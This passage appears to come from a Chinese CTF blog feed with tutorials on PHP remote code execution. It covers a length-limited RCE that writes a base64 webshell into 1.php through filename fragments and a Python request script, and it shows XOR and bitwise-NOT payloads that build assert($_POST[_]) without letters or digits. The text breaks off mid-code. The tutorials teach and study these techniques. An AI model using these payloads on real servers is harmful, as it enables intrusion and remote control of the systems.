class="line">&gt;ch\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;a\\</span><br><span class="line">&gt;HA\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;hb\\</span><br><span class="line">&gt;Cg\\     </span><br><span class="line">&gt;kX\\</span><br><span class="line">&gt;1B\\</span><br><span class="line">&gt;PU\\</span><br><span class="line">&gt;1R\\</span><br><span class="line">&gt;bM\\</span><br><span class="line">&gt;V0\\</span><br><span class="line">&gt;pO\\</span><br><span class="line">&gt;w=\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;hp</span><br></pre></td></tr></table></figure><p>但由于前面讲的，我们得按照时间得先后顺序，给它倒过来，害这真的是个体力活：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;w=\\</span><br><span class="line">&gt;pO\\</span><br><span class="line">&gt;V0\\</span><br><span class="line">&gt;bM\\</span><br><span class="line">&gt;1R\\</span><br><span class="line">&gt;PU\\</span><br><span class="line">&gt;1B\\</span><br><span class="line">&gt;kX\\</span><br><span class="line">&gt;Cg\\ </span><br><span class="line">&gt;hb\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;HA\\</span><br><span class="line">&gt;a\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br></pre></td></tr></table></figure><p>然后我们在<code>kali</code>中做测试，一个一个按顺序把它敲进去，太艰难了</p><p><img src="https://i.loli.net/2021/08/06/3zCL7GQYegayrmD.png" alt="image.png"></p><p>可以看到已经成功了，它已经按照时间顺序排序好了，那我们就把它执行的结果写入文件<code>f</code>中，然后利用<code>sh</code>来执行<code>f</code>，看能不能成功生成<code>1.php</code></p><p><img src="https://i.loli.net/2021/08/06/qheSFP7Z9wBfrtn.png" alt="image.png"></p><p>成功了成功了，<code>1.php</code>成功生成，内容也是我们想要的，哇看到这个我真的感觉前面的辛苦都值了哈哈哈</p><p>3.拼接出命令<code>ls -th &gt;f</code>，害本来第二步我就想讲这个的，结果写着写着就写偏了，前面我们的<code>ls -t &gt;f</code>这命令是直接写的，实际上题目中我们是肯定不可能直接写的，同样需要把它写成文件名拼接起来写入文件中，然后执行它，这就需要我们前面铺垫的知识了，这里我先把构造结果写出来，然后再分析，如果哪一步没看懂可以去上面看对应的铺垫知识哦：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v  (等同于命令：dir &quot;f&gt;&quot; &quot;ht‐&quot; &quot;sl&quot; &gt; v )</span><br><span class="line">&gt;rev </span><br><span class="line">*v&gt;0 前面的*v等同于命令rev v，相当于将v中的文件内容倒了回来，变回:ls -th &gt;f</span><br><span class="line">然后将倒转后的内容写入文件0中，文件0中的内容为:ls -th &gt;f</span><br></pre></td></tr></table></figure><p>首先是用<code>dir</code>代替了<code>ls</code>，原因上面也讲了，然后我们这里用<code>-th</code>代替了<code>-t</code>是因为字母顺序的问题，因为我们这里是选择先倒着写然后再用<code>rev</code>命令把它正过来，字母<code>h</code>顺序正好在字母<code>s</code>和<code>f</code>之间，所以说就可以，如果只有<code>t</code>的话它就会排在<code>s</code>的后面，顺序就乱了</p><p>4.综合第二三步</p><p>前两步构造出来之后其实我们的核心步骤就已经完成了，第二步我们构造出来要执行的命令，第三步将要执行的命令写入到一个文件中，然后就是执行命令的过程了，先执行<code>ls -th &gt;f</code>也就是<code>sh 0</code>，再执行文件<code>f</code>也就是<code>sh f</code>即可成功写入一句话，综合一下payload就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev </span><br><span class="line">*v&gt;0</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;w=\\</span><br><span class="line">&gt;pO\\</span><br><span class="line">&gt;V0\\</span><br><span class="line">&gt;bM\\</span><br><span class="line">&gt;1R\\</span><br><span class="line">&gt;PU\\</span><br><span class="line">&gt;1B\\</span><br><span class="line">&gt;kX\\</span><br><span class="line">&gt;Cg\\ </span><br><span class="line">&gt;hb\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;HA\\</span><br><span class="line">&gt;a\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh 0</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><p>5.写python脚本</p><p>前面也看到了，我们要是纯靠手把这些payload全部输进去还是有些麻烦的，所以说我们还是写个python脚本来代替我们发起这些请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span> : <span class="string">&#x27;ccc&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://xx.xxx.xx.xxx:10001/shell.php?pass=LTLT_666&amp;big_hacker_LTLT=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()),headers=headers)</span><br></pre></td></tr></table></figure><p>这里面我加了个UA头是因为核心代码中说了目录名就是<code>/var/www/html/wllm/&#39;.md5(&quot;wllm&quot; . $_SERVER[&#39;HTTP_USER_AGENT&#39;])</code>那相当于我这个目录名就是<code>/var/www/html/md5(wllmccc)</code>，也就是<code>/var/www/html/wllm/09dfd2544882e2d4cfc851dcb1e78c4f</code>，payload.txt中的内容就是上面那段payload，接下来开始跑脚本：</p><p><img src="https://i.loli.net/2021/08/07/7AezlyJB8t6Ojci.png" alt="image.png"></p><p>跑完脚本去看这个文件是否已经生成，发现已经生成，那就大功告成了，执行命令和用蚁剑连接都是可以的哦</p><p><img src="https://i.loli.net/2021/08/07/wmT1ZU2sIjlFgQz.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/07/oveGnEIgk1VN9w8.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/07/qHdfM2OkwmINgVo.png" alt="image.png"></p><p>参考文章：<a href="https://blog.csdn.net/qq_45521281/article/details/105900489">https://blog.csdn.net/qq_45521281/article/details/105900489</a></p><p><a href="https://blog.csdn.net/shuteer_xu/article/details/103485470">https://blog.csdn.net/shuteer_xu/article/details/103485470</a></p><p><a href="https://blog.csdn.net/q20010619/article/details/109206728">https://blog.csdn.net/q20010619/article/details/109206728</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;限制长度下的命令执行&quot;&gt;&lt;a href=&quot;#限制长度下的命令执行&quot; class=&quot;headerlink&quot; title=&quot;限制长度下的命令执行&quot;&gt;&lt;/a&gt;限制长度下的命令执行&lt;/h1&gt;&lt;p&gt;前段时间团队考核遇到过一个限制长度下的rce，虽然是按照别人的脚本复现出来了，但其实里面的原理什么的完全没搞懂，害还是太菜了，找了些文章也基本上就是直接上脚本，趁着假期就把这些基础知识总结一下&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="https://arsenetang.github.io/tags/RCE/"/>
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RCE篇之无数字字母rce</title>
    <link href="https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/"/>
    <id>https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/</id>
    <published>2021-07-27T16:00:00.000Z</published>
    <updated>2021-08-09T14:14:06.740Z</updated>
    
    <content type="html"><![CDATA[<h1 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h1><p>无数字字母rce，这是一个老生常谈的问题了，就是不利用数字和字母构造出<code>webshell</code>，从而能够执行我们的命令，之前一直没有系统总结过，今天来好好总结总结，这里主要是总结异或和取反两种方法，这两种方法是目前来看最实用的两种方法，还有一种自增的方法稍微介绍一下就好</p><span id="more"></span><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的思路就是利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p><h2 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或 ^"></a>1.异或 ^</h2><p>这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，所以说当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong>，<code>ascii码</code>表参考如下：</p><p><img src="https://i.loli.net/2021/07/27/vmfHFZrN9GLSC8j.png" alt="image.png"></p><p>那假如说我们想要构造出小写字母<code>a</code>，按照上表，<code>a</code>的二进制为<code>01100001</code>，那我们就可以选择两个非字母数字的字符进行异或，这里有很多种选法，我选择的是<code>@</code>和<code>!</code>这两个，成功异或出了字母<code>a</code>：</p><p><img src="https://i.loli.net/2021/07/27/9LjN3A1XWbI5gyQ.png" alt="image.png"></p><p>然后我们就可以按照这个方法进行拼接了，我们的目标字符串是<code>assert($_POST[_])</code>，其实很简单，我们需要拼接的字母只有九个而已，拼接结果如下，因为很多都是不可见的字符，所以说我就先url编码了一下（url编码就是它的16进制编码前面加个<code>%</code>哈）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">P:<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; O:<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span> ; S:<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span></span><br><span class="line">拼接起来：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);  <span class="comment">// $_=assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);  <span class="comment">// $__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><p>以上是我自己构造的，经检验没有问题，构造结果可能会有很多种，但方法都是一样的，这样就可以成功进行rce了，</p><p><img src="https://i.loli.net/2021/07/27/vSh3eydGNwBzgkZ.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/27/kypjYmDBNxHvRET.png" alt="image.png"></p><h2 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反 ~"></a>2.取反 ~</h2><p>取反也是php中的一种运算符，关于取反的具体规则可以参考这篇文章：<a href="https://blog.csdn.net/WilliamsWayne/article/details/78259501">https://blog.csdn.net/WilliamsWayne/article/details/78259501</a>，写得挺详细的，取反的好处就是，它每一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>首先，我们想要构造的依然是<code>assert($_POST[_])</code>这条语句，和上面一样，我们先用<code>php</code>的取反符号<code>~</code>将字符串<code>assert</code>和<code>_POST</code>取反，这里需要注意的是，由于它取反之后会有大量不可显字符，所以我们同样需要将其url编码，然后当我们要用的时候，再利用取反符号把它们取回来即可，具体请见下图：</p><p><img src="https://i.loli.net/2021/07/28/AYS9t7P1phwTdaK.png" alt="image.png"></p><p>可以看到，<code>assert</code>的取反结果是<code>%9E%8C%8C%9A%8D%8B</code>，<code>_POST</code>的取反结果是<code>%A0%AF%B0%AC%AB</code>，那我们就开始构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);    <span class="comment">//这里利用取反符号把它取回来，$_=assert</span></span><br><span class="line"><span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);      <span class="comment">//$__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;                   <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);                 <span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);<span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/28/4NFVPvmRjJueMqs.png" alt="image.png"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>方法二是我看p神博客才了解到的方法，就是说利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，然后再进行一次取反操作，就能得到一个我们想要的字符，这里的原理我确实是不知道，因为这里好像是涉及到计组知识而我现在还没学，害，现在就只有先学会怎么用，原理后面再补了</p><p><img src="https://i.loli.net/2021/07/28/6lw7a4knZY3B9SH.png" alt="image.png"></p><p>这里之所以会输出两个相同的<code>r</code>，就是因为里面<code>$_&#123;1&#125;</code>就是<code>\x8d</code>，然后这里对<code>\x86</code>进行取反就能得到<code>r</code>，原理不详</p><p>总之我们需要知道的是，对于一个汉字进行<code>~($x&#123;0&#125;)</code>或<code>~($x&#123;1&#125;)</code>或<code>~($x&#123;2&#125;)</code>的操作，可以得到某个<code>ascii码</code>的字符值，我们就可以利用这一点构造出<code>webshell</code></p><p>这里由于不知道原理，我就不自己构造了，直接拿出网上大神的exp:<a href="https://xz.aliyun.com/t/8107">https://xz.aliyun.com/t/8107</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>++;                <span class="comment">//得到1，此时$_=1</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;          <span class="comment">//$____=&#x27;_&#x27;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;           <span class="comment">//$_ = $_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);           <span class="comment">//assert($_POST[_])</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;<span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$_</span> = <span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br></pre></td></tr></table></figure><p>由于不可见字符的原因，我们还是要进行url编码之后才能正常使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 